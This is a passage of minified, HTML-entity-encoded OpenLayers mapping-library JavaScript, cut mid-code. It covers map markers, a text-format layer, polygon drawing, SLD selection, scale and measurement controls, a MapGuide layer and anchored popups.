this.createElementNSPlus("csw:ResponseHandler",&#123;value:a.value&#125;)&#125;,Query:function(a)&#123;a||(a=&#123;&#125;);var b=this.createElementNSPlus("csw:Query",&#123;attributes:&#123;typeNames:a.typeNames||"csw:Record"&#125;&#125;),c=a.ElementName;if(OpenLayers.Util.isArray(c)&amp;&amp;0&lt;c.length)for(var d=0,e=c.length;d&lt;e;d++)this.writeNode("csw:ElementName",c[d],b);else this.writeNode("csw:ElementSetName",a.ElementSetName||&#123;value:"summary"&#125;,b);a.Constraint&amp;&amp;this.writeNode("csw:Constraint",a.Constraint,b);a.SortBy&amp;&amp;this.writeNode("ogc:SortBy",a.SortBy,b);return b&#125;,ElementName:function(a)&#123;return this.createElementNSPlus("csw:ElementName",&#123;value:a.value&#125;)&#125;,ElementSetName:function(a)&#123;return this.createElementNSPlus("csw:ElementSetName",&#123;attributes:&#123;typeNames:a.typeNames&#125;,value:a.value&#125;)&#125;,Constraint:function(a)&#123;var b=this.createElementNSPlus("csw:Constraint",&#123;attributes:&#123;version:a.version&#125;&#125;);if(a.Filter)&#123;var c=new OpenLayers.Format.Filter(&#123;version:a.version&#125;);b.appendChild(c.write(a.Filter))&#125;else a.CqlText&amp;&amp;(a=this.createElementNSPlus("CqlText",&#123;value:a.CqlText.value&#125;),b.appendChild(a));return b&#125;&#125;,ogc:OpenLayers.Format.Filter.v1_1_0.prototype.writers.ogc&#125;,CLASS_NAME:"OpenLayers.Format.CSWGetRecords.v2_0_2"&#125;);/* Apache 2 Contains portions of Rico &lt;http://openrico.org/&gt; Copyright 2005 Sabre Airline Solutions Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License. */OpenLayers.Marker.Box=OpenLayers.Class(OpenLayers.Marker,&#123;bounds:null,div:null,initialize:function(a,b,c)&#123;this.bounds=a;this.div=OpenLayers.Util.createDiv();this.div.style.overflow="hidden";this.events=new OpenLayers.Events(this,this.div);this.setBorder(b,c)&#125;,destroy:function()&#123;this.div=this.bounds=null;OpenLayers.Marker.prototype.destroy.apply(this,arguments)&#125;,setBorder:function(a,b)&#123;a||(a="red");b||(b=2);this.div.style.border=b+"px solid "+a&#125;,draw:function(a,b)&#123;OpenLayers.Util.modifyDOMElement(this.div,null,a,b);return this.div&#125;,onScreen:function()&#123;var a=!1;this.map&amp;&amp;(a=this.map.getExtent().containsBounds(this.bounds,!0,!0));return a&#125;,display:function(a)&#123;this.div.style.display=a?"":"none"&#125;,CLASS_NAME:"OpenLayers.Marker.Box"&#125;);OpenLayers.Format.Text=OpenLayers.Class(OpenLayers.Format,&#123;defaultStyle:null,extractStyles:!0,initialize:function(a)&#123;a=a||&#123;&#125;;!1!==a.extractStyles&amp;&amp;(a.defaultStyle=&#123;externalGraphic:OpenLayers.Util.getImageLocation("marker.png"),graphicWidth:21,graphicHeight:25,graphicXOffset:-10.5,graphicYOffset:-12.5&#125;);OpenLayers.Format.prototype.initialize.apply(this,[a])&#125;,read:function(a)&#123;a=a.split("\n");for(var b,c=[],d=0;d&lt;a.length-1;d++)&#123;var e=a[d].replace(/^\s*/,"").replace(/\s*$/,"");if("#"!=e.charAt(0))if(b)&#123;for(var e=e.split("\t"),f=new OpenLayers.Geometry.Point(0,0),g=&#123;&#125;,h=this.defaultStyle?OpenLayers.Util.applyDefaults(&#123;&#125;,this.defaultStyle):null,k=!1,l=0;l&lt;e.length;l++)if(e[l])if("point"==b[l])k=e[l].split(","),f.y=parseFloat(k[0]),f.x=parseFloat(k[1]),k=!0;else if("lat"==b[l])f.y=parseFloat(e[l]),k=!0;else if("lon"==b[l])f.x=parseFloat(e[l]),k=!0;else if("title"==b[l])g.title=e[l];else if("image"==b[l]||"icon"==b[l]&amp;&amp;h)h.externalGraphic=e[l];else if("iconSize"==b[l]&amp;&amp;h)&#123;var m=e[l].split(",");h.graphicWidth=parseFloat(m[0]);h.graphicHeight=parseFloat(m[1])&#125;else"iconOffset"==b[l]&amp;&amp;h?(m=e[l].split(","),h.graphicXOffset=parseFloat(m[0]),h.graphicYOffset=parseFloat(m[1])):"description"==b[l]?g.description=e[l]:"overflow"==b[l]?g.overflow=e[l]:g[b[l]]=e[l];k&amp;&amp;(this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;f.transform(this.externalProjection,this.internalProjection),e=new OpenLayers.Feature.Vector(f,g,h),c.push(e))&#125;else b=e.split("\t")&#125;return c&#125;,CLASS_NAME:"OpenLayers.Format.Text"&#125;);OpenLayers.Layer.Text=OpenLayers.Class(OpenLayers.Layer.Markers,&#123;location:null,features:null,formatOptions:null,selectedFeature:null,initialize:function(a,b)&#123;OpenLayers.Layer.Markers.prototype.initialize.apply(this,arguments);this.features=[]&#125;,destroy:function()&#123;OpenLayers.Layer.Markers.prototype.destroy.apply(this,arguments);this.clearFeatures();this.features=null&#125;,loadText:function()&#123;this.loaded||null==this.location||(this.events.triggerEvent("loadstart"),OpenLayers.Request.GET(&#123;url:this.location,success:this.parseData,failure:function(a)&#123;this.events.triggerEvent("loadend")&#125;,scope:this&#125;),this.loaded=!0)&#125;,moveTo:function(a,b,c)&#123;OpenLayers.Layer.Markers.prototype.moveTo.apply(this,arguments);this.visibility&amp;&amp;!this.loaded&amp;&amp;this.loadText()&#125;,parseData:function(a)&#123;a=a.responseText;var b=&#123;&#125;;OpenLayers.Util.extend(b,this.formatOptions);this.map&amp;&amp;!this.projection.equals(this.map.getProjectionObject())&amp;&amp;(b.externalProjection=this.projection,b.internalProjection=this.map.getProjectionObject());a=(new OpenLayers.Format.Text(b)).read(a);for(var b=0,c=a.length;b&lt;c;b++)&#123;var d=&#123;&#125;,e=a[b],f,g,h;f=new OpenLayers.LonLat(e.geometry.x,e.geometry.y);e.style.graphicWidth&amp;&amp;e.style.graphicHeight&amp;&amp;(g=new OpenLayers.Size(e.style.graphicWidth,e.style.graphicHeight));void 0!==e.style.graphicXOffset&amp;&amp;void 0!==e.style.graphicYOffset&amp;&amp;(h=new OpenLayers.Pixel(e.style.graphicXOffset,e.style.graphicYOffset));null!=e.style.externalGraphic?d.icon=new OpenLayers.Icon(e.style.externalGraphic,g,h):(d.icon=OpenLayers.Marker.defaultIcon(),null!=g&amp;&amp;d.icon.setSize(g));null!=e.attributes.title&amp;&amp;null!=e.attributes.description&amp;&amp;(d.popupContentHTML="&lt;h2&gt;"+e.attributes.title+"&lt;/h2&gt;&lt;p&gt;"+e.attributes.description+"&lt;/p&gt;");d.overflow=e.attributes.overflow||"auto";d=new OpenLayers.Feature(this,f,d);this.features.push(d);f=d.createMarker();null!=e.attributes.title&amp;&amp;null!=e.attributes.description&amp;&amp;f.events.register("click",d,this.markerClick);this.addMarker(f)&#125;this.events.triggerEvent("loadend")&#125;,markerClick:function(a)&#123;var b=this==this.layer.selectedFeature;this.layer.selectedFeature=b?null:this;for(var c=0,d=this.layer.map.popups.length;c&lt;d;c++)this.layer.map.removePopup(this.layer.map.popups[c]);b||this.layer.map.addPopup(this.createPopup());OpenLayers.Event.stop(a)&#125;,clearFeatures:function()&#123;if(null!=this.features)for(;0&lt;this.features.length;)&#123;var a=this.features[0];OpenLayers.Util.removeItem(this.features,a);a.destroy()&#125;&#125;,CLASS_NAME:"OpenLayers.Layer.Text"&#125;);OpenLayers.Handler.RegularPolygon=OpenLayers.Class(OpenLayers.Handler.Drag,&#123;sides:4,radius:null,snapAngle:null,snapToggle:"shiftKey",layerOptions:null,persist:!1,irregular:!1,citeCompliant:!1,angle:null,fixedRadius:!1,feature:null,layer:null,origin:null,initialize:function(a,b,c)&#123;c&amp;&amp;c.layerOptions&amp;&amp;c.layerOptions.styleMap||(this.style=OpenLayers.Util.extend(OpenLayers.Feature.Vector.style["default"],&#123;&#125;));OpenLayers.Handler.Drag.prototype.initialize.apply(this,[a,b,c]);this.options=c?c:&#123;&#125;&#125;,setOptions:function(a)&#123;OpenLayers.Util.extend(this.options,a);OpenLayers.Util.extend(this,a)&#125;,activate:function()&#123;var a=!1;OpenLayers.Handler.Drag.prototype.activate.apply(this,arguments)&amp;&amp;(a=OpenLayers.Util.extend(&#123;displayInLayerSwitcher:!1,calculateInRange:OpenLayers.Function.True,wrapDateLine:this.citeCompliant&#125;,this.layerOptions),this.layer=new OpenLayers.Layer.Vector(this.CLASS_NAME,a),this.map.addLayer(this.layer),a=!0);return a&#125;,deactivate:function()&#123;var a=!1;OpenLayers.Handler.Drag.prototype.deactivate.apply(this,arguments)&amp;&amp;(this.dragging&amp;&amp;this.cancel(),null!=this.layer.map&amp;&amp;(this.layer.destroy(!1),this.feature&amp;&amp;this.feature.destroy()),this.feature=this.layer=null,a=!0);return a&#125;,down:function(a)&#123;this.fixedRadius=!!this.radius;a=this.layer.getLonLatFromViewPortPx(a.xy);this.origin=new OpenLayers.Geometry.Point(a.lon,a.lat);if(!this.fixedRadius||this.irregular)this.radius=this.map.getResolution();this.persist&amp;&amp;this.clear();this.feature=new OpenLayers.Feature.Vector;this.createGeometry();this.callback("create",[this.origin,this.feature]);this.layer.addFeatures([this.feature],&#123;silent:!0&#125;);this.layer.drawFeature(this.feature,this.style)&#125;,move:function(a)&#123;var b=this.layer.getLonLatFromViewPortPx(a.xy),b=new OpenLayers.Geometry.Point(b.lon,b.lat);this.irregular?(a=Math.sqrt(2)*Math.abs(b.y-this.origin.y)/2,this.radius=Math.max(this.map.getResolution()/2,a)):this.fixedRadius?this.origin=b:(this.calculateAngle(b,a),this.radius=Math.max(this.map.getResolution()/2,b.distanceTo(this.origin)));this.modifyGeometry();if(this.irregular)&#123;a=b.x-this.origin.x;var b=b.y-this.origin.y,c;c=0==b?a/(this.radius*Math.sqrt(2)):a/b;this.feature.geometry.resize(1,this.origin,c);this.feature.geometry.move(a/2,b/2)&#125;this.layer.drawFeature(this.feature,this.style)&#125;,up:function(a)&#123;this.finalize();this.start==this.last&amp;&amp;this.callback("done",[a.xy])&#125;,out:function(a)&#123;this.finalize()&#125;,createGeometry:function()&#123;this.angle=Math.PI*(1/this.sides-0.5);this.snapAngle&amp;&amp;(this.angle+=this.snapAngle*(Math.PI/180));this.feature.geometry=OpenLayers.Geometry.Polygon.createRegularPolygon(this.origin,this.radius,this.sides,this.snapAngle)&#125;,modifyGeometry:function()&#123;var a,b,c=this.feature.geometry.components[0];c.components.length!=this.sides+1&amp;&amp;(this.createGeometry(),c=this.feature.geometry.components[0]);for(var d=0;d&lt;this.sides;++d)b=c.components[d],a=this.angle+2*d*Math.PI/this.sides,b.x=this.origin.x+this.radius*Math.cos(a),b.y=this.origin.y+this.radius*Math.sin(a),b.clearBounds()&#125;,calculateAngle:function(a,b)&#123;var c=Math.atan2(a.y-this.origin.y,a.x-this.origin.x);if(this.snapAngle&amp;&amp;this.snapToggle&amp;&amp;!b[this.snapToggle])&#123;var d=Math.PI/180*this.snapAngle;this.angle=Math.round(c/d)*d&#125;else this.angle=c&#125;,cancel:function()&#123;this.callback("cancel",null);this.finalize()&#125;,finalize:function()&#123;this.origin=null;this.radius=this.options.radius&#125;,clear:function()&#123;this.layer&amp;&amp;(this.layer.renderer.clear(),this.layer.destroyFeatures())&#125;,callback:function(a,b)&#123;this.callbacks[a]&amp;&amp;this.callbacks[a].apply(this.control,[this.feature.geometry.clone()]);this.persist||"done"!=a&amp;&amp;"cancel"!=a||this.clear()&#125;,CLASS_NAME:"OpenLayers.Handler.RegularPolygon"&#125;);OpenLayers.Control.SLDSelect=OpenLayers.Class(OpenLayers.Control,&#123;clearOnDeactivate:!1,layers:null,callbacks:null,selectionSymbolizer:&#123;Polygon:&#123;fillColor:"#FF0000",stroke:!1&#125;,Line:&#123;strokeColor:"#FF0000",strokeWidth:2&#125;,Point:&#123;graphicName:"square",fillColor:"#FF0000",pointRadius:5&#125;&#125;,layerOptions:null,sketchStyle:null,wfsCache:&#123;&#125;,layerCache:&#123;&#125;,initialize:function(a,b)&#123;OpenLayers.Control.prototype.initialize.apply(this,[b]);this.callbacks=OpenLayers.Util.extend(&#123;done:this.select,click:this.select&#125;,this.callbacks);this.handlerOptions=this.handlerOptions||&#123;&#125;;this.layerOptions=OpenLayers.Util.applyDefaults(this.layerOptions,&#123;displayInLayerSwitcher:!1,tileOptions:&#123;maxGetUrlLength:2048&#125;&#125;);this.sketchStyle&amp;&amp;(this.handlerOptions.layerOptions=OpenLayers.Util.applyDefaults(this.handlerOptions.layerOptions,&#123;styleMap:new OpenLayers.StyleMap(&#123;"default":this.sketchStyle&#125;)&#125;));this.handler=new a(this,this.callbacks,this.handlerOptions)&#125;,destroy:function()&#123;for(var a in this.layerCache)delete this.layerCache[a];for(a in this.wfsCache)delete this.wfsCache[a];OpenLayers.Control.prototype.destroy.apply(this,arguments)&#125;,coupleLayerVisiblity:function(a)&#123;this.setVisibility(a.object.getVisibility())&#125;,createSelectionLayer:function(a)&#123;var b;if(this.layerCache[a.id])b=this.layerCache[a.id];else&#123;b=new OpenLayers.Layer.WMS(a.name,a.url,a.params,OpenLayers.Util.applyDefaults(this.layerOptions,a.getOptions()));this.layerCache[a.id]=b;if(!1===this.layerOptions.displayInLayerSwitcher)a.events.on(&#123;visibilitychanged:this.coupleLayerVisiblity,scope:b&#125;);this.map.addLayer(b)&#125;return b&#125;,createSLD:function(a,b,c)&#123;for(var d=&#123;version:"1.0.0",namedLayers:&#123;&#125;&#125;,e=(""+a.params.LAYERS).split(","),f=0,g=e.length;f&lt;g;f++)&#123;var h=e[f];d.namedLayers[h]=&#123;name:h,userStyles:[]&#125;;var k=this.selectionSymbolizer,l=c[f];0&lt;=l.type.indexOf("Polygon")?k=&#123;Polygon:this.selectionSymbolizer.Polygon&#125;:0&lt;=l.type.indexOf("LineString")?k=&#123;Line:this.selectionSymbolizer.Line&#125;:0&lt;=l.type.indexOf("Point")&amp;&amp;(k=&#123;Point:this.selectionSymbolizer.Point&#125;);d.namedLayers[h].userStyles.push(&#123;name:"default",rules:[new OpenLayers.Rule(&#123;symbolizer:k,filter:b[f],maxScaleDenominator:a.options.minScale&#125;)]&#125;)&#125;return(new OpenLayers.Format.SLD(&#123;srsName:this.map.getProjection()&#125;)).write(d)&#125;,parseDescribeLayer:function(a)&#123;var b=new OpenLayers.Format.WMSDescribeLayer,c=a.responseXML;c&amp;&amp;c.documentElement||(c=a.responseText);a=b.read(c);for(var b=[],c=null,d=0,e=a.length;d&lt;e;d++)"WFS"==a[d].owsType&amp;&amp;(b.push(a[d].typeName),c=a[d].owsURL);OpenLayers.Request.GET(&#123;url:c,params:&#123;SERVICE:"WFS",TYPENAME:b.toString(),REQUEST:"DescribeFeatureType",VERSION:"1.0.0"&#125;,callback:function(a)&#123;var b=new OpenLayers.Format.WFSDescribeFeatureType,c=a.responseXML;c&amp;&amp;c.documentElement||(c=a.responseText);a=b.read(c);this.control.wfsCache[this.layer.id]=a;this.control._queue&amp;&amp;this.control.applySelection()&#125;,scope:this&#125;)&#125;,getGeometryAttributes:function(a)&#123;var b=[];a=this.wfsCache[a.id];for(var c=0,d=a.featureTypes.length;c&lt;d;c++)for(var e=a.featureTypes[c].properties,f=0,g=e.length;f&lt;g;f++)&#123;var h=e[f],k=h.type;(0&lt;=k.indexOf("LineString")||0&lt;=k.indexOf("GeometryAssociationType")||0&lt;=k.indexOf("GeometryPropertyType")||0&lt;=k.indexOf("Point")||0&lt;=k.indexOf("Polygon"))&amp;&amp;b.push(h)&#125;return b&#125;,activate:function()&#123;var a=OpenLayers.Control.prototype.activate.call(this);if(a)for(var b=0,c=this.layers.length;b&lt;c;b++)&#123;var d=this.layers[b];d&amp;&amp;!this.wfsCache[d.id]&amp;&amp;OpenLayers.Request.GET(&#123;url:d.url,params:&#123;SERVICE:"WMS",VERSION:d.params.VERSION,LAYERS:d.params.LAYERS,REQUEST:"DescribeLayer"&#125;,callback:this.parseDescribeLayer,scope:&#123;layer:d,control:this&#125;&#125;)&#125;return a&#125;,deactivate:function()&#123;var a=OpenLayers.Control.prototype.deactivate.call(this);if(a)for(var b=0,c=this.layers.length;b&lt;c;b++)&#123;var d=this.layers[b];if(d&amp;&amp;!0===this.clearOnDeactivate)&#123;var e=this.layerCache,f=e[d.id];f&amp;&amp;(d.events.un(&#123;visibilitychanged:this.coupleLayerVisiblity,scope:f&#125;),f.destroy(),delete e[d.id])&#125;&#125;return a&#125;,setLayers:function(a)&#123;this.active?(this.deactivate(),this.layers=a,this.activate()):this.layers=a&#125;,createFilter:function(a,b)&#123;var c=null;this.handler instanceof OpenLayers.Handler.RegularPolygon?c=!0===this.handler.irregular?new OpenLayers.Filter.Spatial(&#123;type:OpenLayers.Filter.Spatial.BBOX,property:a.name,value:b.getBounds()&#125;):new OpenLayers.Filter.Spatial(&#123;type:OpenLayers.Filter.Spatial.INTERSECTS,property:a.name,value:b&#125;):this.handler instanceof OpenLayers.Handler.Polygon?c=new OpenLayers.Filter.Spatial(&#123;type:OpenLayers.Filter.Spatial.INTERSECTS,property:a.name,value:b&#125;):this.handler instanceof OpenLayers.Handler.Path?c=0&lt;=a.type.indexOf("Point")?new OpenLayers.Filter.Spatial(&#123;type:OpenLayers.Filter.Spatial.DWITHIN,property:a.name,distance:0.01*this.map.getExtent().getWidth(),distanceUnits:this.map.getUnits(),value:b&#125;):new OpenLayers.Filter.Spatial(&#123;type:OpenLayers.Filter.Spatial.INTERSECTS,property:a.name,value:b&#125;):this.handler instanceof OpenLayers.Handler.Click&amp;&amp;(c=0&lt;=a.type.indexOf("Polygon")?new OpenLayers.Filter.Spatial(&#123;type:OpenLayers.Filter.Spatial.INTERSECTS,property:a.name,value:b&#125;):new OpenLayers.Filter.Spatial(&#123;type:OpenLayers.Filter.Spatial.DWITHIN,property:a.name,distance:0.01*this.map.getExtent().getWidth(),distanceUnits:this.map.getUnits(),value:b&#125;));return c&#125;,select:function(a)&#123;this._queue=function()&#123;for(var b=0,c=this.layers.length;b&lt;c;b++)&#123;for(var d=this.layers[b],e=this.getGeometryAttributes(d),f=[],g=0,h=e.length;g&lt;h;g++)&#123;var k=e[g];if(null!==k)&#123;if(!(a instanceof OpenLayers.Geometry))&#123;var l=this.map.getLonLatFromPixel(a.xy);a=new OpenLayers.Geometry.Point(l.lon,l.lat)&#125;k=this.createFilter(k,a);null!==k&amp;&amp;f.push(k)&#125;&#125;g=this.createSelectionLayer(d);this.events.triggerEvent("selected",&#123;layer:d,filters:f&#125;);d=this.createSLD(d,f,e);g.mergeNewParams(&#123;SLD_BODY:d&#125;);delete this._queue&#125;&#125;;this.applySelection()&#125;,applySelection:function()&#123;for(var a=!0,b=0,c=this.layers.length;b&lt;c;b++)if(!this.wfsCache[this.layers[b].id])&#123;a=!1;break&#125;a&amp;&amp;this._queue.call(this)&#125;,CLASS_NAME:"OpenLayers.Control.SLDSelect"&#125;);OpenLayers.Control.Scale=OpenLayers.Class(OpenLayers.Control,&#123;element:null,geodesic:!1,initialize:function(a,b)&#123;OpenLayers.Control.prototype.initialize.apply(this,[b]);this.element=OpenLayers.Util.getElement(a)&#125;,draw:function()&#123;OpenLayers.Control.prototype.draw.apply(this,arguments);this.element||(this.element=document.createElement("div"),this.div.appendChild(this.element));this.map.events.register("moveend",this,this.updateScale);this.updateScale();return this.div&#125;,updateScale:function()&#123;var a;if(!0===this.geodesic)&#123;if(!this.map.getUnits())return;a=OpenLayers.INCHES_PER_UNIT;a=(this.map.getGeodesicPixelSize().w||1E-6)*a.km*OpenLayers.DOTS_PER_INCH&#125;else a=this.map.getScale();a&amp;&amp;(a=9500&lt;=a&amp;&amp;95E4&gt;=a?Math.round(a/1E3)+"K":95E4&lt;=a?Math.round(a/1E6)+"M":Math.round(a),this.element.innerHTML=OpenLayers.i18n("Scale = 1 : $&#123;scaleDenom&#125;",&#123;scaleDenom:a&#125;))&#125;,CLASS_NAME:"OpenLayers.Control.Scale"&#125;);OpenLayers.Layer.MapGuide=OpenLayers.Class(OpenLayers.Layer.Grid,&#123;isBaseLayer:!0,useHttpTile:!1,singleTile:!1,useOverlay:!1,useAsyncOverlay:!0,TILE_PARAMS:&#123;operation:"GETTILEIMAGE",version:"1.2.0"&#125;,SINGLE_TILE_PARAMS:&#123;operation:"GETMAPIMAGE",format:"PNG",locale:"en",clip:"1",version:"1.0.0"&#125;,OVERLAY_PARAMS:&#123;operation:"GETDYNAMICMAPOVERLAYIMAGE",format:"PNG",locale:"en",clip:"1",version:"2.0.0"&#125;,FOLDER_PARAMS:&#123;tileColumnsPerFolder:30,tileRowsPerFolder:30,format:"png",querystring:null&#125;,defaultSize:new OpenLayers.Size(300,300),tileOriginCorner:"tl",initialize:function(a,b,c,d)&#123;OpenLayers.Layer.Grid.prototype.initialize.apply(this,arguments);if(null==d||null==d.isBaseLayer)this.isBaseLayer="true"!=this.transparent&amp;&amp;!0!=this.transparent;d&amp;&amp;null!=d.useOverlay&amp;&amp;(this.useOverlay=d.useOverlay);this.singleTile?this.useOverlay?(OpenLayers.Util.applyDefaults(this.params,this.OVERLAY_PARAMS),this.useAsyncOverlay||(this.params.version="1.0.0")):OpenLayers.Util.applyDefaults(this.params,this.SINGLE_TILE_PARAMS):(this.useHttpTile?OpenLayers.Util.applyDefaults(this.params,this.FOLDER_PARAMS):OpenLayers.Util.applyDefaults(this.params,this.TILE_PARAMS),this.setTileSize(this.defaultSize))&#125;,clone:function(a)&#123;null==a&amp;&amp;(a=new OpenLayers.Layer.MapGuide(this.name,this.url,this.params,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])&#125;,getURL:function(a)&#123;var b;b=a.getCenterLonLat();var c=this.map.getSize();this.singleTile?(a=&#123;setdisplaydpi:OpenLayers.DOTS_PER_INCH,setdisplayheight:c.h*this.ratio,setdisplaywidth:c.w*this.ratio,setviewcenterx:b.lon,setviewcentery:b.lat,setviewscale:this.map.getScale()&#125;,this.useOverlay&amp;&amp;!this.useAsyncOverlay&amp;&amp;(b=&#123;&#125;,b=OpenLayers.Util.extend(b,a),b.operation="GETVISIBLEMAPEXTENT",b.version="1.0.0",b.session=this.params.session,b.mapName=this.params.mapName,b.format="text/xml",b=this.getFullRequestString(b),OpenLayers.Request.GET(&#123;url:b,async:!1&#125;)),b=this.getFullRequestString(a)):(c=this.map.getResolution(),b=Math.floor((a.left-this.maxExtent.left)/c),b=Math.round(b/this.tileSize.w),a=Math.floor((this.maxExtent.top-a.top)/c),a=Math.round(a/this.tileSize.h),b=this.useHttpTile?this.getImageFilePath(&#123;tilecol:b,tilerow:a,scaleindex:this.resolutions.length-this.map.zoom-1&#125;):this.getFullRequestString(&#123;tilecol:b,tilerow:a,scaleindex:this.resolutions.length-this.map.zoom-1&#125;));return b&#125;,getFullRequestString:function(a,b)&#123;var c=null==b?this.url:b;"object"==typeof c&amp;&amp;(c=c[Math.floor(Math.random()*c.length)]);var d=c,e=OpenLayers.Util.extend(&#123;&#125;,this.params),e=OpenLayers.Util.extend(e,a),f=OpenLayers.Util.upperCaseObject(OpenLayers.Util.getParameters(c)),g;for(g in e)g.toUpperCase()in f&amp;&amp;delete e[g];e=OpenLayers.Util.getParameterString(e);e=e.replace(/,/g,"+");""!=e&amp;&amp;(f=c.charAt(c.length-1),d="&amp;"==f||"?"==f?d+e:-1==c.indexOf("?")?d+("?"+e):d+("&amp;"+e));return d&#125;,getImageFilePath:function(a,b)&#123;var c=null==b?this.url:b;"object"==typeof c&amp;&amp;(c=c[Math.floor(Math.random()*c.length)]);var d="",e="";0&gt;a.tilerow&amp;&amp;(d="-");d=0==a.tilerow?d+"0":d+Math.floor(Math.abs(a.tilerow/this.params.tileRowsPerFolder))*this.params.tileRowsPerFolder;0&gt;a.tilecol&amp;&amp;(e="-");e=0==a.tilecol?e+"0":e+Math.floor(Math.abs(a.tilecol/this.params.tileColumnsPerFolder))*this.params.tileColumnsPerFolder;d="/S"+Math.floor(a.scaleindex)+"/"+this.params.basemaplayergroupname+"/R"+d+"/C"+e+"/"+a.tilerow%this.params.tileRowsPerFolder+"_"+a.tilecol%this.params.tileColumnsPerFolder+"."+this.params.format;this.params.querystring&amp;&amp;(d+="?"+this.params.querystring);return c+d&#125;,CLASS_NAME:"OpenLayers.Layer.MapGuide"&#125;);OpenLayers.Control.Measure=OpenLayers.Class(OpenLayers.Control,&#123;callbacks:null,displaySystem:"metric",geodesic:!1,displaySystemUnits:&#123;geographic:["dd"],english:["mi","ft","in"],metric:["km","m"]&#125;,partialDelay:300,delayedTrigger:null,persist:!1,immediate:!1,initialize:function(a,b)&#123;OpenLayers.Control.prototype.initialize.apply(this,[b]);var c=&#123;done:this.measureComplete,point:this.measurePartial&#125;;this.immediate&amp;&amp;(c.modify=this.measureImmediate);this.callbacks=OpenLayers.Util.extend(c,this.callbacks);this.handlerOptions=OpenLayers.Util.extend(&#123;persist:this.persist&#125;,this.handlerOptions);this.handler=new a(this,this.callbacks,this.handlerOptions)&#125;,deactivate:function()&#123;this.cancelDelay();return OpenLayers.Control.prototype.deactivate.apply(this,arguments)&#125;,cancel:function()&#123;this.cancelDelay();this.handler.cancel()&#125;,setImmediate:function(a)&#123;(this.immediate=a)?this.callbacks.modify=this.measureImmediate:delete this.callbacks.modify&#125;,updateHandler:function(a,b)&#123;var c=this.active;c&amp;&amp;this.deactivate();this.handler=new a(this,this.callbacks,b);c&amp;&amp;this.activate()&#125;,measureComplete:function(a)&#123;this.cancelDelay();this.measure(a,"measure")&#125;,measurePartial:function(a,b)&#123;this.cancelDelay();b=b.clone();this.handler.freehandMode(this.handler.evt)?this.measure(b,"measurepartial"):this.delayedTrigger=window.setTimeout(OpenLayers.Function.bind(function()&#123;this.delayedTrigger=null;this.measure(b,"measurepartial")&#125;,this),this.partialDelay)&#125;,measureImmediate:function(a,b,c)&#123;c&amp;&amp;!this.handler.freehandMode(this.handler.evt)&amp;&amp;(this.cancelDelay(),this.measure(b.geometry,"measurepartial"))&#125;,cancelDelay:function()&#123;null!==this.delayedTrigger&amp;&amp;(window.clearTimeout(this.delayedTrigger),this.delayedTrigger=null)&#125;,measure:function(a,b)&#123;var c,d;-1&lt;a.CLASS_NAME.indexOf("LineString")?(c=this.getBestLength(a),d=1):(c=this.getBestArea(a),d=2);this.events.triggerEvent(b,&#123;measure:c[0],units:c[1],order:d,geometry:a&#125;)&#125;,getBestArea:function(a)&#123;for(var b=this.displaySystemUnits[this.displaySystem],c,d,e=0,f=b.length;e&lt;f&amp;&amp;!(c=b[e],d=this.getArea(a,c),1&lt;d);++e);return[d,c]&#125;,getArea:function(a,b)&#123;var c,d;this.geodesic?(c=a.getGeodesicArea(this.map.getProjectionObject()),d="m"):(c=a.getArea(),d=this.map.getUnits());var e=OpenLayers.INCHES_PER_UNIT[b];e&amp;&amp;(c*=Math.pow(OpenLayers.INCHES_PER_UNIT[d]/e,2));return c&#125;,getBestLength:function(a)&#123;for(var b=this.displaySystemUnits[this.displaySystem],c,d,e=0,f=b.length;e&lt;f&amp;&amp;!(c=b[e],d=this.getLength(a,c),1&lt;d);++e);return[d,c]&#125;,getLength:function(a,b)&#123;var c,d;this.geodesic?(c=a.getGeodesicLength(this.map.getProjectionObject()),d="m"):(c=a.getLength(),d=this.map.getUnits());var e=OpenLayers.INCHES_PER_UNIT[b];e&amp;&amp;(c*=OpenLayers.INCHES_PER_UNIT[d]/e);return c&#125;,CLASS_NAME:"OpenLayers.Control.Measure"&#125;);OpenLayers.Format.WMC.v1_0_0=OpenLayers.Class(OpenLayers.Format.WMC.v1,&#123;VERSION:"1.0.0",schemaLocation:"http://www.opengis.net/context http://schemas.opengis.net/context/1.0.0/context.xsd",initialize:function(a)&#123;OpenLayers.Format.WMC.v1.prototype.initialize.apply(this,[a])&#125;,read_wmc_SRS:function(a,b)&#123;var c=this.getChildValue(b);"object"!=typeof a.projections&amp;&amp;(a.projections=&#123;&#125;);for(var c=c.split(/ +/),d=0,e=c.length;d&lt;e;d++)a.projections[c[d]]=!0&#125;,write_wmc_Layer:function(a)&#123;var b=OpenLayers.Format.WMC.v1.prototype.write_wmc_Layer.apply(this,[a]);if(a.srs)&#123;var c=[],d;for(d in a.srs)c.push(d);b.appendChild(this.createElementDefaultNS("SRS",c.join(" ")))&#125;b.appendChild(this.write_wmc_FormatList(a));b.appendChild(this.write_wmc_StyleList(a));a.dimensions&amp;&amp;b.appendChild(this.write_wmc_DimensionList(a));b.appendChild(this.write_wmc_LayerExtension(a))&#125;,CLASS_NAME:"OpenLayers.Format.WMC.v1_0_0"&#125;);OpenLayers.Popup.Anchored=OpenLayers.Class(OpenLayers.Popup,&#123;relativePosition:null,keepInMap:!0,anchor:null,initialize:function(a,b,c,d,e,f,g)&#123;OpenLayers.Popup.prototype.initialize.apply(this,[a,b,c,d,f,g]);this.anchor=null!=e?e:&#123;size:new OpenLayers.Size(0,0),offset:new OpenLayers.Pixel(0,0)&#125;&#125;,destroy:function()&#123;this.relativePosition=this.anchor=null;OpenLayers.Popup.prototype.destroy.apply(this,arguments)&#125;,show:function()&#123;this.updatePosition();OpenLayers.Popup.prototype.show.apply(this,arguments)&#125;,moveTo:function(a)&#123;var b=this.relativePosition;this.relativePosition=this.calculateRelativePosition(a);OpenLayers.Popup.prototype.moveTo.call(this,this.calculateNewPx(a));this.relativePosition!=b&amp;&amp;this.updateRelativePosition()&#125;,setSize:function(a)&#123;OpenLayers.Popup.prototype.setSize.apply(this,arguments);if(this.lonlat&amp;&amp;this.map)&#123;var 